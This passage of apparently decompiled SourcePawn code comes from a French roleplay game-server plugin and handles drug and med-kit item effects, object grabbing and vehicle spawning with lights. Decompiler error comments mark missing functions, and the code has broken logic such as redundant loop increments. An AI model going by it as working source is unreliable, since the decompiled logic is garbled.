				}
			}
			PrintToChat(param1, "[L-RP] Vous avez echoue votre tentative de crochettage.");
		}
	}
	return Action:0;
}

public ItemLSD(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ClientCommand(client, "r_screenoverlay models/effects/portalfunnel_sheet.vmt");
		SetEntityGravity(client, 0.8);
		ModifySpeed(client, any:1069547520, 90);
		TE_SetupBeamFollow(client, g_BeamSpriteFollow, 0, 10, 5, 50, 3, 214328);
		TE_SendToAll(0);
	}
	return 0;
}

public ItemHero(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ClientCommand(client, "r_screenoverlay effects/com_shield002a.vmt");
		SetEntityHealth(client, 50);
		SetEntityGravity(client, 0.4);
		Client_Shake(client, 0, 25, 200, 90);
		CreateTimer(60, DrugReset, client, 0);
	}
	return 0;
}

public ItemExtasy(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ModifySpeed(client, any:1073741824, 90);
		ClientCommand(client, "r_screenoverlay effects/tp_eyefx/tp_eyefx.vmt");
		CreateTimer(60, DrugReset, client, 0);
	}
	return 0;
}

public ItemCoke(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ModifySpeed(client, any:1073741824, 90);
		ClientCommand(client, "r_screenoverlay debug/yuv.vmt");
		CreateTimer(90, DrugReset, client, 0);
	}
	return 0;
}

public ItemWeed(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ModifySpeed(client, any:1061997773, 90);
		SetEntityHealth(client, 150);
		SetEntityGravity(client, 0.8);
		ClientCommand(client, "r_screenoverlay models/props_combine/portalball001_sheet.vmt");
		CreateTimer(90, DrugReset, client, 0);
	}
	return 0;
}

public ItemVodkas(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ClientCommand(client, "r_screenoverlay effects/tp_eyefx/tpeye.vmt");
		Client_Shake(client, 0, 25, 200, 60);
		CreateTimer(60, DrugReset, client, 0);
	}
	return 0;
}

public ItemRedbulle(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ClientCommand(client, "r_screenoverlay effects/tp_eyefx/tpeye2.vmt");
		ModifySpeed(client, any:1068708659, 120);
		SetEntityHealth(client, 100);
		SetEntProp(client, PropType:1, "m_ArmorValue", any:100, 4, 0);
	}
	return 0;
}

public Action:DrugReset(Handle:Timer, client)
{
	new var1;
	if (IsClientInGame(client))
	{
		ModifySpeed(client, any:1065353216, 0);
		SetEntityGravity(client, 1);
		ClientCommand(client, "r_screenoverlay 0");
	}
	return Action:0;
}

public ItemCartouches(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		decl String:WeaponName[32];
		Client_GetActiveWeaponName(client, WeaponName, 32);
		new weapon = Client_GetActiveWeapon(client);
		RemoveEdict(weapon);
		GivePlayerItem(client, WeaponName, 0);
	}
	return 0;
}

public ItemKitSoin(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		new Ent = GetClientAimTarget(client, true);
		if (Ent != -1)
		{
			new var2;
			if (JobID[Ent][0][0] == 1)
			{
				new var6 = KitSoins[client];
				var6 = var6[0][0] + -1;
				new var5;
				if (JobID[Ent][0][0] == 1)
				{
					SetEntityHealth(Ent, 500);
				}
				else
				{
					SetEntityHealth(Ent, 100);
				}
				PrintToChat(client, "[L-RP] Vous avez soigner les blessures de %N avec un Kit de Soins.", Ent);
				PrintToChat(Ent, "[L-RP] %N a soigner vos blessures avec un Kit de Soins.", client);
			}
			else
			{
				PrintToChat(client, "[L-RP] Ce joueur n'a pas besoin de soins.");
			}
		}
		else
		{
			PrintToChat(client, "[L-RP] Vous devez viser un joueur.");
		}
	}
	return 0;
}


/* ERROR! Unable to cast object of type 'Lysis.LStack' to type 'Lysis.LConstant'. */
 function "GrabSomething" (number 295)
public Action:Command_GrabToggle(client, args)
{
	if (IsPlayerAlive(client))
	{
		if (gObj[client][0][0] != -1)
		{
			gObj[client] = -1;
		}
		GrabSomething(client);
	}
	return Action:3;
}

public Action:UpdateObjects(Handle:timer)
{
	decl Float:vecDir[3];
	decl Float:vecPos[3];
	decl Float:vecVel[3];
	decl Float:viewang[3];
	new i = 1;
	while (i < MaxClients)
	{
		if (ValidGrab(i))
		{
			decl Float:client_vec[3];
			decl Float:ent_vec[3];
			new Float:dist_vec = 0;
			GetClientAbsOrigin(i, client_vec);
			GetEntPropVector(gObj[i][0][0], PropType:0, "m_vecOrigin", ent_vec, 0);
			dist_vec = GetVectorDistance(client_vec, ent_vec, false);
			new var1;
			if (dist_vec < 300)
			{
				new var2;
				if (GetEntityMoveType(gObj[i][0][0]))
				{
					GetClientEyeAngles(i, viewang);
					GetAngleVectors(viewang, vecDir, NULL_VECTOR, NULL_VECTOR);
					GetClientEyePosition(i, vecPos);
					vecPos[0] = vecPos[0] + vecDir[0] * gDistance[i][0][0];
					vecPos[1] += vecDir[1] * gDistance[i][0][0];
					vecPos[2] += vecDir[2] * gDistance[i][0][0];
					GetEntPropVector(gObj[i][0][0], PropType:0, "m_vecOrigin", vecDir, 0);
					SubtractVectors(vecPos, vecDir, vecVel);
					ScaleVector(vecVel, 10);
					TeleportEntity(gObj[i][0][0], NULL_VECTOR, NULL_VECTOR, vecVel);
					i++;
				}
				else
				{
					gObj[i] = -1;
					i++;
				}
				i++;
			}
			else
			{
				gObj[i] = -1;
				i++;
			}
			i++;
		}
		i++;
	}
	return Action:0;
}

GetObject(client, bool:hitSelf)
{
	decl ent;
	if (ValidGrab(client))
	{
		ent = gObj[client][0][0];
	}
	else
	{
		ent = TraceToEntity(client);
	}
	new var1;
	if (IsValidEntity(ent))
	{
		decl String:edictname[64];
		GetEdictClassname(ent, edictname, 64);
		if (StrEqual(edictname, "worldspawn", true))
		{
			if (hitSelf)
			{
				ent = client;
			}
			ent = -1;
		}
	}
	else
	{
		ent = -1;
	}
	return ent;
}

ReplacePhysicsEntity(ent)
{
	decl Float:VecPos_Ent[3];
	decl Float:VecAng_Ent[3];
	decl String:model[128];
	GetEntPropString(ent, PropType:1, "m_ModelName", model, 128, 0);
	GetEntPropVector(ent, PropType:0, "m_vecOrigin", VecPos_Ent, 0);
	GetEntPropVector(ent, PropType:0, "m_angRotation", VecAng_Ent, 0);
	AcceptEntityInput(ent, "Wake", -1, -1, 0);
	AcceptEntityInput(ent, "EnableMotion", -1, -1, 0);
	AcceptEntityInput(ent, "EnableDamageForces", -1, -1, 0);
	DispatchKeyValue(ent, "physdamagescale", "0.0");
	TeleportEntity(ent, VecPos_Ent, VecAng_Ent, NULL_VECTOR);
	SetEntityMoveType(ent, MoveType:6);
	return ent;
}

bool:ValidGrab(client)
{
	new obj = gObj[client][0][0];
	new var1;
	if (obj)
	{
		return true;
	}
	return false;
}

public TraceToEntity(client)
{
	decl Float:vecClientEyePos[3];
	decl Float:vecClientEyeAng[3];
	GetClientEyePosition(client, vecClientEyePos);
	GetClientEyeAngles(client, vecClientEyeAng);
	TR_TraceRayFilter(vecClientEyePos, vecClientEyeAng, 33636363, RayType:1, TraceASDF, client);
	if (TR_DidHit(Handle:0))
	{
		return TR_GetEntityIndex(Handle:0);
	}
	return -1;
}

public bool:TraceASDF(entity, mask, data)
{
	return entity != data;
}

SpawnVehicle(client, Float:spawnorigin[3], Float:spawnangles[3], String:model[], String:script[], skin, vehicletype, VehicleLife, bool:siren, bool:IsChair)
{
	if (client)
	{
		decl Float:EyeAng[3];
		GetClientEyeAngles(client, EyeAng);
		decl Float:ForwardVec[3];
		GetAngleVectors(EyeAng, ForwardVec, NULL_VECTOR, NULL_VECTOR);
		ScaleVector(ForwardVec, 100);
		ForwardVec[2] = 0;
		decl Float:EyePos[3];
		GetClientEyePosition(client, EyePos);
		decl Float:AbsAngle[3];
		GetClientAbsAngles(client, AbsAngle);
		decl Float:SpawnAngles[3];
		SpawnAngles[1] = EyeAng[1];
		decl Float:SpawnOrigin[3];
		AddVectors(EyePos, ForwardVec, SpawnOrigin);
		spawnorigin[0] = SpawnOrigin[0];
		spawnorigin[1] = SpawnOrigin[1];
		spawnorigin[2] = SpawnOrigin[2];
		spawnangles[0] = SpawnAngles[0];
		spawnangles[1] = SpawnAngles[1];
		spawnangles[2] = SpawnAngles[2];
	}
	new VehicleIndex = CreateEntityByName("prop_vehicle_driveable", -1);
	if (IsValidEntity(VehicleIndex))
	{
		Cars_Driver_Prop[VehicleIndex] = -1;
		decl String:TargetName[64];
		decl String:light_index[16];
		Format(TargetName, 64, "%i_%N", VehicleIndex, client);
		DispatchKeyValue(VehicleIndex, "targetname", TargetName);
		Format(light_index, 16, "%iLgt", VehicleIndex);
		DispatchKeyValue(VehicleIndex, "model", model);
		DispatchKeyValue(VehicleIndex, "vehiclescript", script);
		SetEntProp(VehicleIndex, PropType:0, "m_nSolidType", any:6, 4, 0);
		SetEntProp(VehicleIndex, PropType:0, "m_nSkin", skin, 4, 0);
		if (vehicletype)
		{
			SetEntProp(VehicleIndex, PropType:1, "m_nVehicleType", any:8, 4, 0);
		}
		DispatchSpawn(VehicleIndex);
		ActivateEntity(VehicleIndex);
		SetEntProp(VehicleIndex, PropType:1, "m_nNextThinkTick", any:-1, 4, 0);
		SDKHook(VehicleIndex, SDKHookType:2, OnVehicleTakeDamage);
		decl Float:MinHull[3];
		decl Float:MaxHull[3];
		GetEntPropVector(VehicleIndex, PropType:0, "m_vecMins", MinHull, 0);
		GetEntPropVector(VehicleIndex, PropType:0, "m_vecMaxs", MaxHull, 0);
		new Float:temp = MinHull[0];
		MinHull[0] = MinHull[1];
		MinHull[1] = temp;
		temp = MaxHull[0];
		MaxHull[0] = MaxHull[1];
		MaxHull[1] = temp;
		if (client)
		{
			if (client)
			{
				TR_TraceHullFilter(spawnorigin, spawnorigin, MinHull, MaxHull, 33570827, RayDontHitClient, client);
			}
			else
			{
				TR_TraceHull(spawnorigin, spawnorigin, MinHull, MaxHull, 33570827);
			}
			if (TR_DidHit(Handle:0))
			{
				AcceptEntityInput(VehicleIndex, "KillHierarchy", -1, -1, 0);
				RemoveEdict(VehicleIndex);
				if (client)
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas la place de faire apparaitre la voiture.");
				}
				return -1;
			}
		}
		TeleportEntity(VehicleIndex, spawnorigin, spawnangles, NULL_VECTOR);
		ViewEnt[VehicleIndex] = -1;
		SetEntProp(VehicleIndex, PropType:1, "m_takedamage", any:2, 4, 0);
		SetEntProp(VehicleIndex, PropType:1, "m_iHealth", VehicleLife, 4, 0);
		AcceptEntityInput(VehicleIndex, "Lock", -1, -1, 0);
		SDKHook(VehicleIndex, SDKHookType:9, OnThink);
		decl Float:brake_rgb[3];
		decl Float:brake_angles[3];
		decl Float:white_rgb[3];
		decl Float:blue_rgb[3];
		brake_rgb[0] = 255;
		brake_rgb[1] = 0;
		brake_rgb[2] = 0;
		blue_rgb[0] = 0;
		blue_rgb[1] = 0;
		blue_rgb[2] = 255;
		white_rgb[0] = 255;
		white_rgb[1] = 255;
		white_rgb[2] = 255;
		brake_angles[0] = 0;
		brake_angles[1] = 0;
		brake_angles[2] = 0;
		new brake_l = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(brake_l, "parentname", TargetName);
		DispatchKeyValue(brake_l, "targetname", light_index);
		DispatchKeyValueFloat(brake_l, "HDRColorScale", 1);
		DispatchKeyValue(brake_l, "renderamt", "155");
		DispatchKeyValueVector(brake_l, "rendercolor", brake_rgb);
		DispatchKeyValueVector(brake_l, "angles", brake_angles);
		DispatchKeyValue(brake_l, "spawnflags", "3");
		DispatchKeyValue(brake_l, "rendermode", "5");
		DispatchKeyValue(brake_l, "model", "sprites/light_glow02.spr");
		DispatchKeyValueFloat(brake_l, "scale", 0.2);
		DispatchSpawn(brake_l);
		TeleportEntity(brake_l, spawnorigin, NULL_VECTOR, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(brake_l, "SetParent", brake_l, brake_l, 0);
		SetVariantString("light_rl");
		AcceptEntityInput(brake_l, "SetParentAttachment", brake_l, brake_l, 0);
		g_CarLights[VehicleIndex][0][0][0] = brake_l;
		new brake_r = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(brake_l, "parentname", TargetName);
		DispatchKeyValue(brake_l, "targetname", light_index);
		DispatchKeyValueFloat(brake_r, "HDRColorScale", 1);
		DispatchKeyValue(brake_r, "renderamt", "155");
		DispatchKeyValueVector(brake_r, "rendercolor", brake_rgb);
		DispatchKeyValueVector(brake_r, "angles", brake_angles);
		DispatchKeyValue(brake_r, "spawnflags", "3");
		DispatchKeyValue(brake_r, "rendermode", "5");
		DispatchKeyValue(brake_r, "model", "sprites/light_glow02.spr");
		DispatchKeyValueFloat(brake_r, "scale", 0.2);
		DispatchSpawn(brake_r);
		TeleportEntity(brake_r, spawnorigin, NULL_VECTOR, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(brake_r, "SetParent", brake_r, brake_r, 0);
		SetVariantString("light_rr");
		AcceptEntityInput(brake_r, "SetParentAttachment", brake_r, brake_r, 0);
		g_CarLights[VehicleIndex][0][0][1] = brake_r;
		new brake_l2 = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(brake_l2, "parentname", TargetName);
		DispatchKeyValue(brake_l2, "targetname", light_index);
		DispatchKeyValueFloat(brake_l2, "HDRColorScale", 1);
		DispatchKeyValue(brake_l2, "renderamt", "100");
		DispatchKeyValueVector(brake_l2, "rendercolor", brake_rgb);
		DispatchKeyValueVector(brake_l2, "angles", brake_angles);
		DispatchKeyValue(brake_l2, "spawnflags", "3");
		DispatchKeyValue(brake_l2, "rendermode", "5");
		DispatchKeyValue(brake_l2, "model", "sprites/light_glow02.spr");
		DispatchKeyValueFloat(brake_l2, "scale", 0.2);
		DispatchSpawn(brake_l2);
		TeleportEntity(brake_l2, spawnorigin, NULL_VECTOR, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(brake_l2, "SetParent", brake_l, brake_l, 0);
		SetVariantString("light_rl");
		AcceptEntityInput(brake_l2, "SetParentAttachment", brake_l, brake_l, 0);
		g_CarLights[VehicleIndex][0][0][2] = brake_l2;
		new brake_r2 = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(brake_r2, "parentname", TargetName);
		DispatchKeyValue(brake_r2, "targetname", light_index);
		DispatchKeyValueFloat(brake_r2, "HDRColorScale", 1);
		DispatchKeyValue(brake_r2, "renderamt", "100");
		DispatchKeyValueVector(brake_r2, "rendercolor", brake_rgb);
		DispatchKeyValueVector(brake_r2, "angles", brake_angles);
		DispatchKeyValue(brake_r2, "spawnflags", "3");
		DispatchKeyValue(brake_r2, "rendermode", "5");
		DispatchKeyValue(brake_r2, "model", "sprites/light_glow02.spr");
		DispatchKeyValueFloat(brake_r2, "scale", 0.2);
		DispatchSpawn(brake_r2);
		TeleportEntity(brake_r2, spawnorigin, NULL_VECTOR, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(brake_r2, "SetParent", brake_r, brake_r, 0);
		SetVariantString("light_rr");
		AcceptEntityInput(brake_r2, "SetParentAttachment", brake_r, brake_r, 0);
		g_CarLights[VehicleIndex][0][0][3] = brake_r2;
		if (siren)
		{
			new blue_1 = CreateEntityByName("env_sprite", -1);
			DispatchKeyValue(blue_1, "parentname", TargetName);
			DispatchKeyValue(blue_1, "targetname", light_index);
			DispatchKeyValueFloat(blue_1, "HDRColorScale", 1);
			DispatchKeyValue(blue_1, "renderamt", "255");
			DispatchKeyValueVector(blue_1, "rendercolor", blue_rgb);
			DispatchKeyValueVector(blue_1, "angles", brake_angles);
			DispatchKeyValue(blue_1, "spawnflags", "3");
			DispatchKeyValue(blue_1, "rendermode", "5");
			DispatchKeyValue(blue_1, "model", "sprites/light_glow02.spr");
			DispatchSpawn(blue_1);
			TeleportEntity(blue_1, spawnorigin, NULL_VECTOR, NULL_VECTOR);
			SetVariantString(TargetName);
			AcceptEntityInput(blue_1, "SetParent", blue_1, blue_1, 0);
			SetVariantString("light_bar1");
			AcceptEntityInput(blue_1, "SetParentAttachment", blue_1, blue_1, 0);
			AcceptEntityInput(blue_1, "HideSprite", -1, -1, 0);
			g_CarLights[VehicleIndex][0][0][4] = blue_1;
			new blue_2 = CreateEntityByName("env_sprite", -1);
			DispatchKeyValue(blue_2, "parentname", TargetName);
			DispatchKeyValue(blue_2, "targetname", light_index);
			DispatchKeyValueFloat(blue_2, "HDRColorScale", 1);
			DispatchKeyValue(blue_2, "renderamt", "255");
			DispatchKeyValueVector(blue_2, "rendercolor", blue_rgb);
			DispatchKeyValueVector(blue_2, "angles", brake_angles);
			DispatchKeyValue(blue_2, "spawnflags", "3");
			DispatchKeyValue(blue_2, "rendermode", "5");
			DispatchKeyValue(blue_2, "model", "sprites/light_glow02.spr");
			DispatchSpawn(blue_2);
			TeleportEntity(blue_2, spawnorigin, NULL_VECTOR, NULL_VECTOR);
			SetVariantString(TargetName);
			AcceptEntityInput(blue_2, "SetParent", blue_2, blue_2, 0);
			SetVariantString("light_bar2");
			AcceptEntityInput(blue_2, "SetParentAttachment", blue_2, blue_2, 0);
			AcceptEntityInput(blue_2, "HideSprite", -1, -1, 0);
			g_CarLights[VehicleIndex][0][0][5] = blue_2;
			CarSiren[VehicleIndex] = 0;
		}
		new headlight_l = CreateEntityByName("light_dynamic", -1);
		DispatchKeyValue(headlight_l, "parentname", TargetName);
		DispatchKeyValue(headlight_l, "targetname", light_index);
		DispatchKeyValueVector(headlight_l, "rendercolor", white_rgb);
		DispatchKeyValue(headlight_l, "_inner_cone", "60");
		DispatchKeyValue(headlight_l, "_cone", "70");
		DispatchKeyValueFloat(headlight_l, "spotlight_radius", 220);
		DispatchKeyValueFloat(headlight_l, "distance", 768);
		DispatchKeyValue(headlight_l, "brightness", "2");
		DispatchKeyValue(headlight_l, "_light", "255 255 255 511");
		DispatchKeyValue(headlight_l, "style", "0");
		DispatchKeyValue(headlight_l, "pitch", "-20");
		DispatchKeyValue(headlight_l, "renderamt", "200");
		DispatchSpawn(headlight_l);
		TeleportEntity(headlight_l, spawnorigin, spawnangles, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(headlight_l, "SetParent", headlight_l, headlight_l, 0);
		SetVariantString("light_fl");
		AcceptEntityInput(headlight_l, "SetParentAttachment", headlight_l, headlight_l, 0);
		AcceptEntityInput(headlight_l, "TurnOff", -1, -1, 0);
		g_CarLights[VehicleIndex][0][0][6] = headlight_l;
		new headlight_r = CreateEntityByName("light_dynamic", -1);
		DispatchKeyValue(headlight_r, "parentname", TargetName);
		DispatchKeyValue(headlight_r, "targetname", light_index);
		DispatchKeyValueVector(headlight_r, "rendercolor", white_rgb);
		DispatchKeyValue(headlight_r, "_inner_cone", "60");
		DispatchKeyValue(headlight_r, "_cone", "70");
		DispatchKeyValueFloat(headlight_r, "spotlight_radius", 220);
		DispatchKeyValueFloat(headlight_r, "distance", 768);
		DispatchKeyValue(headlight_r, "brightness", "2");
		DispatchKeyValue(headlight_r, "_light", "255 255 255 511");
		DispatchKeyValue(headlight_r, "style", "0");
		DispatchKeyValue(headlight_r, "pitch", "-20");
		DispatchKeyValue(headlight_r, "renderamt", "200");
		DispatchSpawn(headlight_r);
		TeleportEntity(headlight_r, spawnorigin, spawnangles, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(headlight_r, "SetParent", headlight_r, headlight_r, 0);
		SetVariantString("light_fr");
		AcceptEntityInput(headlight_r, "SetParentAttachment", headlight_r, headlight_r, 0);
		AcceptEntityInput(headlight_r, "TurnOff", -1, -1, 0);
		g_CarLights[VehicleIndex][0][0][7] = headlight_r;
		new headlight_l2 = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(headlight_l2, "parentname", TargetName);
		DispatchKeyValue(headlight_l2, "targetname", light_index);
		DispatchKeyValueFloat(headlight_l2, "HDRColorScale", 1);
		DispatchKeyValue(headlight_l2, "renderamt", "200");
		DispatchKeyValueVector(headlight_l2, "rendercolor", white_rgb);
		DispatchKeyValueVector(headlight_l2, "angles", brake_angles);
		DispatchKeyValue(headlight_l2, "spawnflags", "3");
		DispatchKeyValue(headlight_l2, "rendermode", "5");
		DispatchKeyValue(headlight_l2, "model", "sprites/light_glow03.spr");
		DispatchKeyValueFloat(headlight_l2, "scale", 0.35);
		DispatchSpawn(headlight_l2);
		TeleportEntity(headlight_l2, spawnorigin, NULL_VECTOR, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(headlight_l2, "SetParent", headlight_l2, headlight_l2, 0);
		SetVariantString("light_fl");
		AcceptEntityInput(headlight_l2, "SetParentAttachment", headlight_l2, headlight_l2, 0);
		AcceptEntityInput(headlight_l2, "HideSprite", -1, -1, 0);
		g_CarLights[VehicleIndex][0][0][8] = headlight_l2;
		new headlight_r2 = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(headlight_r2, "parentname", TargetName);
		DispatchKeyValue(headlight_r2, "targetname", light_index);
		DispatchKeyValueFloat(headlight_r2, "HDRColorScale", 1);
		DispatchKeyValue(headlight_r2, "renderamt", "200");
		DispatchKeyValueVector(headlight_r2, "rendercolor", white_rgb);
		DispatchKeyValueVector(headlight_r2, "angles", brake_angles);
		DispatchKeyValue(headlight_r2, "spawnflags", "3");
		DispatchKeyValue(headlight_r2, "rendermode", "5");
		DispatchKeyValue(headlight_r2, "model", "sprites/light_glow03.spr");
		DispatchKeyValueFloat(headlight_r2, "scale", 0.35);
		DispatchSpawn(headlight_r2);
		TeleportEntity(headlight_r2, spawnorigin, NULL_VECTOR, NULL_VECTOR);
		SetVariantString(TargetName);
		AcceptEntityInput(headlight_r2, "SetParent", headlight_r2, headlight_r2, 0);
		SetVariantString("light_fr");
		AcceptEntityInput(headlight_r2, "SetParentAttachment", headlight_r2, headlight_r2, 0);
		AcceptEntityInput(headlight_r2, "HideSprite", -1, -1, 0);
		g_CarLights[VehicleIndex][0][0][9] = headlight_r2;
		if (IsChair)
		{
			new Seat = CreateEntityByName("prop_vehicle_driveable", -1);
			if (IsValidEntity(Seat))
			{
				Cars_Driver_Prop[Seat] = -1;
				seat[VehicleIndex] = Seat;
				decl String:Seat_Name[64];
				Format(Seat_Name, 64, "%i_%i_chair", Seat, VehicleIndex);
				DispatchKeyValue(Seat, "vehiclescript", "scripts/vehicles/chair.txt");
				new var1;
				if (StrEqual(model, "models/natalya/vehicles/impala_v2.mdl", true))
				{
					DispatchKeyValue(Seat, "model", "models/natalya/vehicles/chair_impala.mdl");
				}
				else
				{
					if (StrEqual(model, "models/natalya/vehicles/tacoma_v2.mdl", true))
					{
						DispatchKeyValue(Seat, "model", "models/natalya/vehicles/chair_tacoma_right2.mdl");
					}
					if (StrEqual(model, "models/natalya/vehicles/s197_mustang_v2.mdl", true))
					{
						DispatchKeyValue(Seat, "model", "models/natalya/vehicles/chair_s197_right2.mdl");
					}
					if (StrEqual(model, "models/vehicles/ep1/mustang_gt_redux.mdl", true))
					{
						DispatchKeyValue(Seat, "model", "models/natalya/vehicles/chair_gt_right.mdl");
					}
				}
				DispatchKeyValueFloat(Seat, "MaxPitch", 360);
				DispatchKeyValueFloat(Seat, "MinPitch", -360);
				DispatchKeyValueFloat(Seat, "MaxYaw", 90);
				DispatchKeyValue(Seat, "targetname", Seat_Name);
				DispatchKeyValue(Seat, "solid", "6");
				DispatchKeyValue(Seat, "actionScale", "1");
				DispatchKeyValue(Seat, "EnableGun", "0");
				DispatchKeyValue(Seat, "ignorenormals", "0");
				DispatchKeyValue(Seat, "fadescale", "1");
				DispatchKeyValue(Seat, "fademindist", "-1");
				DispatchKeyValue(Seat, "VehicleLocked", "0");
				DispatchKeyValue(Seat, "screenspacefade", "0");
				DispatchKeyValue(Seat, "spawnflags", "256");
				DispatchKeyValue(Seat, "skin", "0");
				DispatchKeyValue(Seat, "setbodygroup", "511");
				TeleportEntity(Seat, spawnorigin, spawnangles, NULL_VECTOR);
				DispatchSpawn(Seat);
				ActivateEntity(Seat);
				SetEntProp(Seat, PropType:1, "m_nNextThinkTick", any:-1, 4, 0);
				SDKHook(Seat, SDKHookType:9, OnThink);
				AcceptEntityInput(Seat, "TurnOff", -1, -1, 0);
				ViewEnt[Seat] = -1;
				SetVariantString(TargetName);
				AcceptEntityInput(Seat, "SetParent", Seat, Seat, 0);
				new var2;
				if (StrEqual(model, "models/natalya/vehicles/tacoma_v2.mdl", true))
				{
					SetVariantString("vehicle_feet_passenger1");
				}
				else
				{
					if (StrEqual(model, "models/vehicles/ep1/mustang_gt_redux.mdl", true))
					{
						SetVariantString("vehicle_feet_passenger0");
					}
					new var3;
					if (StrEqual(model, "models/natalya/vehicles/impala_v2.mdl", true))
					{
						SetVariantString("seat_fr");
					}
				}
				AcceptEntityInput(Seat, "SetParentAttachment", Seat, Seat, 0);
				return VehicleIndex;
			}
			return VehicleIndex;
		}
		return VehicleIndex;
	}
	return -1;
}

public bool:RayDontHitClient(entity, contentsMask, data)
{
	return data != entity;
}


/* ERROR! Unable to cast object of type 'Lysis.DReturn' to type 'Lysis.DJumpCondition'. */
 function "DontHitClientOrVehicle" (number 305)
public OnEntityDestroyed(entity)
{
	new var1;
	if (IsValidEdict(entity))
	{
		decl String:ClassName[32];
		GetEdictClassname(entity, ClassName, 30);
		if (StrEqual("prop_vehicle_driveable", ClassName, false))
		{
			new Driver = GetEntPropEnt(entity, PropType:0, "m_hPlayer", 0);
			if (Driver != -1)
			{
				AcceptEntityInput(Driver, "ClearParent", -1, -1, 0);
				SetEntPropEnt(Driver, PropType:0, "m_hVehicle", -1, 0);
				SetEntPropEnt(entity, PropType:0, "m_hPlayer", -1, 0);
				SetEntityMoveType(Driver, MoveType:2);
				SetEntProp(Driver, PropType:0, "m_CollisionGroup", any:5, 4, 0);
				new hud = GetEntProp(Driver, PropType:0, "m_iHideHUD", 4, 0);
				hud &= -2;
				hud &= -257;
				hud &= -1025;
				SetEntProp(Driver, PropType:0, "m_iHideHUD", hud, 4, 0);
				new EntEffects = GetEntProp(Driver, PropType:0, "m_fEffects", 4, 0);
				EntEffects &= -33;
				SetEntProp(Driver, PropType:0, "m_fEffects", EntEffects, 4, 0);
				decl Float:ViewOffset[3];
				GetEntPropVector(entity, PropType:1, "m_savedViewOffset", ViewOffset, 0);
				SetEntPropVector(Driver, PropType:1, "m_vecViewOffset", ViewOffset, 0);
				decl Float:ExitAng[3];
				GetEntPropVector(entity, PropType:1, "m_angRotation", ExitAng, 0);
				ExitAng[0] = 0;
				new var2 = ExitAng[1];
				var2 = 90 + var2;
				ExitAng[2] = 0;
				decl Float:null[3];
				TeleportEntity(Driver, NULL_VECTOR, ExitAng, null);
			}
		}
	}
	return 0;
}

public OnPreThink(client)
{
	GetClientEyeAngles(client, CurrentEyeAngle[client][0][0]);
	return 0;
}

public OnThink(entity)
{
	new Driver = GetEntPropEnt(entity, PropType:0, "m_hPlayer", 0);
	if (0 < Driver)
	{
		new car = GetEntPropEnt(Driver, PropType:0, "m_hVehicle", 0);
		if (entity != car)
		{
			LeaveVehicle(Driver);
		}
	}
	decl Float:ang[3];
	if (IsValidEntity(ViewEnt[entity][0][0]))
	{
		if (0 < Driver)
		{
			new var1;
			if (IsClientInGame(Driver))
			{
				SetEntProp(entity, PropType:1, "m_nNextThinkTick", any:1, 4, 0);
				SetEntPropFloat(entity, PropType:1, "m_flTurnOffKeepUpright", 1, 0);
				SetClientViewEntity(Driver, ViewEnt[entity][0][0]);
				if (Cars_Driver_Prop[entity][0][0] == -1)
				{
					new prop = CreateEntityByName("prop_physics_override", -1);
					if (IsValidEntity(prop))
					{
						decl String:model[128];
						GetClientModel(Driver, model, 128);
						DispatchKeyValue(prop, "model", model);
						DispatchKeyValue(prop, "skin", "0");
						ActivateEntity(prop);
						DispatchSpawn(prop);
						new enteffects = GetEntProp(prop, PropType:0, "m_fEffects", 4, 0);
						enteffects |= 1;
						enteffects |= 128;
						enteffects |= 512;
						SetEntProp(prop, PropType:0, "m_fEffects", enteffects, 4, 0);
						decl String:car_ent_name[128];
						GetTargetName(entity, car_ent_name, 128);
						SetVariantString(car_ent_name);
						AcceptEntityInput(prop, "SetParent", prop, prop, 0);
						SetVariantString("vehicle_driver_eyes");
						AcceptEntityInput(prop, "SetParentAttachment", prop, prop, 0);
						Cars_Driver_Prop[entity] = prop;
					}
				}
			}
		}
	}
	if (GetEntProp(entity, PropType:0, "m_bEnterAnimOn", 4, 0) == 1)
	{
		if (0 < Driver)
		{
			EyeFix(Driver);
		}
		SetEntProp(entity, PropType:0, "m_nSequence", any:0, 4, 0);
		CarHorn[Driver] = 0;
		SetEntProp(entity, PropType:0, "m_bEnterAnimOn", any:0, 4, 0);
		SetEntProp(entity, PropType:0, "m_nSequence", any:0, 4, 0);
		SetEntityMoveType(Driver, MoveType:4);
		SetEntProp(Driver, PropType:0, "m_CollisionGroup", any:5, 4, 0);
		decl String:targetName[100];
		decl Float:sprite_rgb[3];
		sprite_rgb[0] = 0;
		sprite_rgb[1] = 0;
		sprite_rgb[2] = 0;
		GetTargetName(entity, targetName, 100);
		new sprite = CreateEntityByName("env_sprite", -1);
		DispatchKeyValue(sprite, "model", "materials/sprites/dot.vmt");
		DispatchKeyValue(sprite, "renderamt", "0");
		DispatchKeyValue(sprite, "renderamt", "0");
		DispatchKeyValueVector(sprite, "rendercolor", sprite_rgb);
		DispatchSpawn(sprite);
		decl Float:vec[3];
		GetClientAbsOrigin(Driver, vec);
		GetClientAbsAngles(Driver, ang);
		TeleportEntity(sprite, vec, ang, NULL_VECTOR);
		SetClientViewEntity(Driver, sprite);
		SetVariantString("!activator");
		AcceptEntityInput(sprite, "SetParent", Driver, -1, 0);
		SetVariantString(targetName);
		AcceptEntityInput(Driver, "SetParent", -1, -1, 0);
		SetVariantString("vehicle_driver_eyes");
		AcceptEntityInput(Driver, "SetParentAttachment", -1, -1, 0);
